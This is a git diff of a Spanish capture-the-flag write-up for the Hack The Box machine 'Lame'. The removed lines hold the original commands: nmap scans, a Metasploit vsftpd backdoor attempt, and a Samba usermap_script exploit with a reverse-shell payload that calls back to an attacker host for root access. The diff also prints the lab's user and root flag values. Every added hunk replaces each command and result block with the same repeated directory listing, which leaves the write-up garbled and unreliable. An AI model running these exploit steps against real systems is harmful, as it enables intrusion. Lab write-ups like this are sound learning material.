@@ -1,6 +1,6 @@
 # 🔓 Análisis completo: Máquina Lame - Hack The Box
 
-![Logo](capturas/logo_r4ms4nt_circular.png)
+![Logo](../capturas/logo_r4ms4nt_circular.png)
 
 > **Primera máquina publicada en Hack The Box**. Diseñada como puerta de entrada para nuevos usuarios. Ideal para aprender enumeración, detección de vulnerabilidades clásicas y explotación básica con Metasploit.
 
@@ -9,17 +9,48 @@
 ## 📁 Estructura del Proyecto
 
 ```
-Lame/
-├── capturas/         # Evidencias visuales por fase
-├── doc/              # Manuales y writeups
-├── exploits/         # Código adaptado o creado
-├── loot/             # Flags y archivos extraídos
-├── nmap/             # Escaneos y salidas de Nmap
-├── scripts/          # Herramientas auxiliares
-└── tree_lame.txt     # Estructura completa del proyecto
+.
+├── capturas
+│   ├── Flag_1.png
+│   ├── Flag_1submit.png
+│   ├── Flag_2.png
+│   ├── Flag_2submit.png
+│   ├── grep_nmap.png
+│   ├── logo_r4ms4nt_circular.png
+│   ├── msfconsole1.png
+│   ├── msfconsole2.png
+│   ├── msfconsole_para_flag1_2.png
+│   ├── msfconsole_para_flag1.png
+│   ├── nmap_port_21.png
+│   ├── nmap_smb.png
+│   ├── nmap_top1000.png
+│   ├── Task_10.png
+│   ├── Task_11_Final.png
+│   ├── Task_1.png
+│   ├── Task_2.png
+│   ├── Task_3.png
+│   ├── Task_4.png
+│   ├── Task_5.png
+│   ├── Task_6.png
+│   └── Task_9.png
+├── doc
+├── lame_htb_manual.md
+├── nmap
+│   ├── ftp_version.gnmap
+│   ├── ftp_version.nmap
+│   ├── ftp_version.xml
+│   ├── smb_version.gnmap
+│   ├── smb_version.nmap
+│   ├── smb_version.xml
+│   ├── top1000_tcp.gnmap
+│   ├── top1000_tcp.nmap
+│   └── top1000_tcp.xml
+└── tree_lame.txt
+
+4 directories, 33 files
 ```
 
-📄 Ver estructura completa: [tree_lame.txt](tree_lame.txt)
+📄 Ver estructura completa: [tree_lame.txt](../tree_lame.txt)
 
 ---
 
@@ -28,15 +59,53 @@ Lame/
 🎯 **Objetivo:** Identificar puertos TCP abiertos más comunes.
 
 ✅ **Comando ejecutado:**
-```bash
-nmap -v -T4 -Pn --top-ports 1000 -oA nmap/top1000_tcp 10.129.56.2
+```
+.
+├── capturas
+│   ├── Flag_1.png
+│   ├── Flag_1submit.png
+│   ├── Flag_2.png
+│   ├── Flag_2submit.png
+│   ├── grep_nmap.png
+│   ├── logo_r4ms4nt_circular.png
+│   ├── msfconsole1.png
+│   ├── msfconsole2.png
+│   ├── msfconsole_para_flag1_2.png
+│   ├── msfconsole_para_flag1.png
+│   ├── nmap_port_21.png
+│   ├── nmap_smb.png
+│   ├── nmap_top1000.png
+│   ├── Task_10.png
+│   ├── Task_11_Final.png
+│   ├── Task_1.png
+│   ├── Task_2.png
+│   ├── Task_3.png
+│   ├── Task_4.png
+│   ├── Task_5.png
+│   ├── Task_6.png
+│   └── Task_9.png
+├── doc
+├── lame_htb_manual.md
+├── nmap
+│   ├── ftp_version.gnmap
+│   ├── ftp_version.nmap
+│   ├── ftp_version.xml
+│   ├── smb_version.gnmap
+│   ├── smb_version.nmap
+│   ├── smb_version.xml
+│   ├── top1000_tcp.gnmap
+│   ├── top1000_tcp.nmap
+│   └── top1000_tcp.xml
+└── tree_lame.txt
+
+4 directories, 33 files
 ```
 
 🔎 **Resultado:**
 - Puertos abiertos: `21`, `22`, `139`, `445`
 - Total: **4**
 
-📸 [Captura](capturas/nmap_top1000.png) | [grep open](capturas/grep_nmap.png)
+📸 [Captura](../capturas/nmap_top1000.png) | [grep open](../capturas/grep_nmap.png)
 
 ---
 
@@ -45,8 +114,46 @@ nmap -v -T4 -Pn --top-ports 1000 -oA nmap/top1000_tcp 10.129.56.2
 🎯 **Objetivo:** Determinar la versión del servicio FTP en el puerto 21.
 
 ✅ **Comando ejecutado:**
-```bash
-nmap -sV -Pn -p21 -oA nmap/ftp_version 10.129.56.2
+```
+.
+├── capturas
+│   ├── Flag_1.png
+│   ├── Flag_1submit.png
+│   ├── Flag_2.png
+│   ├── Flag_2submit.png
+│   ├── grep_nmap.png
+│   ├── logo_r4ms4nt_circular.png
+│   ├── msfconsole1.png
+│   ├── msfconsole2.png
+│   ├── msfconsole_para_flag1_2.png
+│   ├── msfconsole_para_flag1.png
+│   ├── nmap_port_21.png
+│   ├── nmap_smb.png
+│   ├── nmap_top1000.png
+│   ├── Task_10.png
+│   ├── Task_11_Final.png
+│   ├── Task_1.png
+│   ├── Task_2.png
+│   ├── Task_3.png
+│   ├── Task_4.png
+│   ├── Task_5.png
+│   ├── Task_6.png
+│   └── Task_9.png
+├── doc
+├── lame_htb_manual.md
+├── nmap
+│   ├── ftp_version.gnmap
+│   ├── ftp_version.nmap
+│   ├── ftp_version.xml
+│   ├── smb_version.gnmap
+│   ├── smb_version.nmap
+│   ├── smb_version.xml
+│   ├── top1000_tcp.gnmap
+│   ├── top1000_tcp.nmap
+│   └── top1000_tcp.xml
+└── tree_lame.txt
+
+4 directories, 33 files
 ```
 
 📌 **Explicación:**
@@ -57,9 +164,47 @@ nmap -sV -Pn -p21 -oA nmap/ftp_version 10.129.56.2
 
 🔎 **Resultado:**
 ```
-vsftpd 2.3.4
+.
+├── capturas
+│   ├── Flag_1.png
+│   ├── Flag_1submit.png
+│   ├── Flag_2.png
+│   ├── Flag_2submit.png
+│   ├── grep_nmap.png
+│   ├── logo_r4ms4nt_circular.png
+│   ├── msfconsole1.png
+│   ├── msfconsole2.png
+│   ├── msfconsole_para_flag1_2.png
+│   ├── msfconsole_para_flag1.png
+│   ├── nmap_port_21.png
+│   ├── nmap_smb.png
+│   ├── nmap_top1000.png
+│   ├── Task_10.png
+│   ├── Task_11_Final.png
+│   ├── Task_1.png
+│   ├── Task_2.png
+│   ├── Task_3.png
+│   ├── Task_4.png
+│   ├── Task_5.png
+│   ├── Task_6.png
+│   └── Task_9.png
+├── doc
+├── lame_htb_manual.md
+├── nmap
+│   ├── ftp_version.gnmap
+│   ├── ftp_version.nmap
+│   ├── ftp_version.xml
+│   ├── smb_version.gnmap
+│   ├── smb_version.nmap
+│   ├── smb_version.xml
+│   ├── top1000_tcp.gnmap
+│   ├── top1000_tcp.nmap
+│   └── top1000_tcp.xml
+└── tree_lame.txt
+
+4 directories, 33 files
 ```
-📸 [Captura](capturas/nmap_port_21.png)
+📸 [Captura](../capturas/nmap_port_21.png)
 
 ---
 
@@ -68,18 +213,92 @@ vsftpd 2.3.4
 🎯 **Objetivo:** Verificar si el exploit conocido de backdoor funciona.
 
 ✅ **Procedimiento con Metasploit:**
-```bash
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 10.129.56.2
-run
+```
+.
+├── capturas
+│   ├── Flag_1.png
+│   ├── Flag_1submit.png
+│   ├── Flag_2.png
+│   ├── Flag_2submit.png
+│   ├── grep_nmap.png
+│   ├── logo_r4ms4nt_circular.png
+│   ├── msfconsole1.png
+│   ├── msfconsole2.png
+│   ├── msfconsole_para_flag1_2.png
+│   ├── msfconsole_para_flag1.png
+│   ├── nmap_port_21.png
+│   ├── nmap_smb.png
+│   ├── nmap_top1000.png
+│   ├── Task_10.png
+│   ├── Task_11_Final.png
+│   ├── Task_1.png
+│   ├── Task_2.png
+│   ├── Task_3.png
+│   ├── Task_4.png
+│   ├── Task_5.png
+│   ├── Task_6.png
+│   └── Task_9.png
+├── doc
+├── lame_htb_manual.md
+├── nmap
+│   ├── ftp_version.gnmap
+│   ├── ftp_version.nmap
+│   ├── ftp_version.xml
+│   ├── smb_version.gnmap
+│   ├── smb_version.nmap
+│   ├── smb_version.xml
+│   ├── top1000_tcp.gnmap
+│   ├── top1000_tcp.nmap
+│   └── top1000_tcp.xml
+└── tree_lame.txt
+
+4 directories, 33 files
 ```
 
 📌 **Resultado:**
 ```
-Exploit completed, but no session was created.
+.
+├── capturas
+│   ├── Flag_1.png
+│   ├── Flag_1submit.png
+│   ├── Flag_2.png
+│   ├── Flag_2submit.png
+│   ├── grep_nmap.png
+│   ├── logo_r4ms4nt_circular.png
+│   ├── msfconsole1.png
+│   ├── msfconsole2.png
+│   ├── msfconsole_para_flag1_2.png
+│   ├── msfconsole_para_flag1.png
+│   ├── nmap_port_21.png
+│   ├── nmap_smb.png
+│   ├── nmap_top1000.png
+│   ├── Task_10.png
+│   ├── Task_11_Final.png
+│   ├── Task_1.png
+│   ├── Task_2.png
+│   ├── Task_3.png
+│   ├── Task_4.png
+│   ├── Task_5.png
+│   ├── Task_6.png
+│   └── Task_9.png
+├── doc
+├── lame_htb_manual.md
+├── nmap
+│   ├── ftp_version.gnmap
+│   ├── ftp_version.nmap
+│   ├── ftp_version.xml
+│   ├── smb_version.gnmap
+│   ├── smb_version.nmap
+│   ├── smb_version.xml
+│   ├── top1000_tcp.gnmap
+│   ├── top1000_tcp.nmap
+│   └── top1000_tcp.xml
+└── tree_lame.txt
+
+4 directories, 33 files
 ```
 🔴 El puerto 6200 **no respondió externamente**, por lo tanto: **NO** funciona.
-📸 [Captura](capturas/msfconsole1.png)
+📸 [Captura](../capturas/msfconsole1.png)
 
 ---
 
@@ -88,16 +307,92 @@ Exploit completed, but no session was created.
 🎯 **Objetivo:** Detectar versión del servicio SMB/Samba en puertos 139 y 445.
 
 ✅ **Comando ejecutado:**
-```bash
-nmap -sV -Pn -p139,445 --script=smb-os-discovery -oA nmap/smb_version 10.129.56.2
+```
+.
+├── capturas
+│   ├── Flag_1.png
+│   ├── Flag_1submit.png
+│   ├── Flag_2.png
+│   ├── Flag_2submit.png
+│   ├── grep_nmap.png
+│   ├── logo_r4ms4nt_circular.png
+│   ├── msfconsole1.png
+│   ├── msfconsole2.png
+│   ├── msfconsole_para_flag1_2.png
+│   ├── msfconsole_para_flag1.png
+│   ├── nmap_port_21.png
+│   ├── nmap_smb.png
+│   ├── nmap_top1000.png
+│   ├── Task_10.png
+│   ├── Task_11_Final.png
+│   ├── Task_1.png
+│   ├── Task_2.png
+│   ├── Task_3.png
+│   ├── Task_4.png
+│   ├── Task_5.png
+│   ├── Task_6.png
+│   └── Task_9.png
+├── doc
+├── lame_htb_manual.md
+├── nmap
+│   ├── ftp_version.gnmap
+│   ├── ftp_version.nmap
+│   ├── ftp_version.xml
+│   ├── smb_version.gnmap
+│   ├── smb_version.nmap
+│   ├── smb_version.xml
+│   ├── top1000_tcp.gnmap
+│   ├── top1000_tcp.nmap
+│   └── top1000_tcp.xml
+└── tree_lame.txt
+
+4 directories, 33 files
 ```
 
 🔎 **Resultado:**
 ```
-Samba smbd 3.0.20-Debian
+.
+├── capturas
+│   ├── Flag_1.png
+│   ├── Flag_1submit.png
+│   ├── Flag_2.png
+│   ├── Flag_2submit.png
+│   ├── grep_nmap.png
+│   ├── logo_r4ms4nt_circular.png
+│   ├── msfconsole1.png
+│   ├── msfconsole2.png
+│   ├── msfconsole_para_flag1_2.png
+│   ├── msfconsole_para_flag1.png
+│   ├── nmap_port_21.png
+│   ├── nmap_smb.png
+│   ├── nmap_top1000.png
+│   ├── Task_10.png
+│   ├── Task_11_Final.png
+│   ├── Task_1.png
+│   ├── Task_2.png
+│   ├── Task_3.png
+│   ├── Task_4.png
+│   ├── Task_5.png
+│   ├── Task_6.png
+│   └── Task_9.png
+├── doc
+├── lame_htb_manual.md
+├── nmap
+│   ├── ftp_version.gnmap
+│   ├── ftp_version.nmap
+│   ├── ftp_version.xml
+│   ├── smb_version.gnmap
+│   ├── smb_version.nmap
+│   ├── smb_version.xml
+│   ├── top1000_tcp.gnmap
+│   ├── top1000_tcp.nmap
+│   └── top1000_tcp.xml
+└── tree_lame.txt
+
+4 directories, 33 files
 ```
 🟢 Respuesta válida: `3.0.20`
-📸 [Captura](capturas/nmap_smb.png)
+📸 [Captura](../capturas/nmap_smb.png)
 
 ---
 
@@ -112,43 +407,188 @@ Samba smbd 3.0.20-Debian
 ## 🧑‍💻 Task 6: ¿Qué usuario se obtiene tras explotar CVE-2007-2447?
 
 🎯 **Exploit ejecutado:**
-```bash
-use exploit/multi/samba/usermap_script
-set RHOSTS 10.129.56.2
-set PAYLOAD cmd/unix/reverse
-set LHOST 10.10.14.69
-set LPORT 4444
-run
+```
+.
+├── capturas
+│   ├── Flag_1.png
+│   ├── Flag_1submit.png
+│   ├── Flag_2.png
+│   ├── Flag_2submit.png
+│   ├── grep_nmap.png
+│   ├── logo_r4ms4nt_circular.png
+│   ├── msfconsole1.png
+│   ├── msfconsole2.png
+│   ├── msfconsole_para_flag1_2.png
+│   ├── msfconsole_para_flag1.png
+│   ├── nmap_port_21.png
+│   ├── nmap_smb.png
+│   ├── nmap_top1000.png
+│   ├── Task_10.png
+│   ├── Task_11_Final.png
+│   ├── Task_1.png
+│   ├── Task_2.png
+│   ├── Task_3.png
+│   ├── Task_4.png
+│   ├── Task_5.png
+│   ├── Task_6.png
+│   └── Task_9.png
+├── doc
+├── lame_htb_manual.md
+├── nmap
+│   ├── ftp_version.gnmap
+│   ├── ftp_version.nmap
+│   ├── ftp_version.xml
+│   ├── smb_version.gnmap
+│   ├── smb_version.nmap
+│   ├── smb_version.xml
+│   ├── top1000_tcp.gnmap
+│   ├── top1000_tcp.nmap
+│   └── top1000_tcp.xml
+└── tree_lame.txt
+
+4 directories, 33 files
 ```
 
 🔎 **Shell obtenida:**
 ```
-whoami → root
+.
+├── capturas
+│   ├── Flag_1.png
+│   ├── Flag_1submit.png
+│   ├── Flag_2.png
+│   ├── Flag_2submit.png
+│   ├── grep_nmap.png
+│   ├── logo_r4ms4nt_circular.png
+│   ├── msfconsole1.png
+│   ├── msfconsole2.png
+│   ├── msfconsole_para_flag1_2.png
+│   ├── msfconsole_para_flag1.png
+│   ├── nmap_port_21.png
+│   ├── nmap_smb.png
+│   ├── nmap_top1000.png
+│   ├── Task_10.png
+│   ├── Task_11_Final.png
+│   ├── Task_1.png
+│   ├── Task_2.png
+│   ├── Task_3.png
+│   ├── Task_4.png
+│   ├── Task_5.png
+│   ├── Task_6.png
+│   └── Task_9.png
+├── doc
+├── lame_htb_manual.md
+├── nmap
+│   ├── ftp_version.gnmap
+│   ├── ftp_version.nmap
+│   ├── ftp_version.xml
+│   ├── smb_version.gnmap
+│   ├── smb_version.nmap
+│   ├── smb_version.xml
+│   ├── top1000_tcp.gnmap
+│   ├── top1000_tcp.nmap
+│   └── top1000_tcp.xml
+└── tree_lame.txt
+
+4 directories, 33 files
 ```
-📸 [Captura](capturas/msfconsole_para_flag1_2.png)
+📸 [Captura](../capturas/msfconsole_para_flag1_2.png)
 ✅ **Respuesta correcta:** `root`
 
 ---
 
 ## 🏁 Task 7: Flag de Usuario
 
-```bash
-cd /home/makis
-cat user.txt
+```
+.
+├── capturas
+│   ├── Flag_1.png
+│   ├── Flag_1submit.png
+│   ├── Flag_2.png
+│   ├── Flag_2submit.png
+│   ├── grep_nmap.png
+│   ├── logo_r4ms4nt_circular.png
+│   ├── msfconsole1.png
+│   ├── msfconsole2.png
+│   ├── msfconsole_para_flag1_2.png
+│   ├── msfconsole_para_flag1.png
+│   ├── nmap_port_21.png
+│   ├── nmap_smb.png
+│   ├── nmap_top1000.png
+│   ├── Task_10.png
+│   ├── Task_11_Final.png
+│   ├── Task_1.png
+│   ├── Task_2.png
+│   ├── Task_3.png
+│   ├── Task_4.png
+│   ├── Task_5.png
+│   ├── Task_6.png
+│   └── Task_9.png
+├── doc
+├── lame_htb_manual.md
+├── nmap
+│   ├── ftp_version.gnmap
+│   ├── ftp_version.nmap
+│   ├── ftp_version.xml
+│   ├── smb_version.gnmap
+│   ├── smb_version.nmap
+│   ├── smb_version.xml
+│   ├── top1000_tcp.gnmap
+│   ├── top1000_tcp.nmap
+│   └── top1000_tcp.xml
+└── tree_lame.txt
+
+4 directories, 33 files
 ```
 🟢 Flag: `60fc5d64febbdebfe8cc331838bff0b0`
-📸 [Flag 1](capturas/Flag_1.png)
+📸 [Flag 1](../capturas/Flag_1.png)
 
 ---
 
 ## 👑 Task 8: Flag de Root
 
-```bash
-cd /root
-cat root.txt
+```
+.
+├── capturas
+│   ├── Flag_1.png
+│   ├── Flag_1submit.png
+│   ├── Flag_2.png
+│   ├── Flag_2submit.png
+│   ├── grep_nmap.png
+│   ├── logo_r4ms4nt_circular.png
+│   ├── msfconsole1.png
+│   ├── msfconsole2.png
+│   ├── msfconsole_para_flag1_2.png
+│   ├── msfconsole_para_flag1.png
+│   ├── nmap_port_21.png
+│   ├── nmap_smb.png
+│   ├── nmap_top1000.png
+│   ├── Task_10.png
+│   ├── Task_11_Final.png
+│   ├── Task_1.png
+│   ├── Task_2.png
+│   ├── Task_3.png
+│   ├── Task_4.png
+│   ├── Task_5.png
+│   ├── Task_6.png
+│   └── Task_9.png
+├── doc
+├── lame_htb_manual.md
+├── nmap
+│   ├── ftp_version.gnmap
+│   ├── ftp_version.nmap
+│   ├── ftp_version.xml
+│   ├── smb_version.gnmap
+│   ├── smb_version.nmap
+│   ├── smb_version.xml
+│   ├── top1000_tcp.gnmap
+│   ├── top1000_tcp.nmap
+│   └── top1000_tcp.xml
+└── tree_lame.txt
+
+4 directories, 33 files
 ```
 🟢 Flag: `c80b43503b56dc7b0dc82643157b4329`
-📸 [Flag 2](capturas/Flag_2.png)
+📸 [Flag 2](../capturas/Flag_2.png)
 
 ---
 
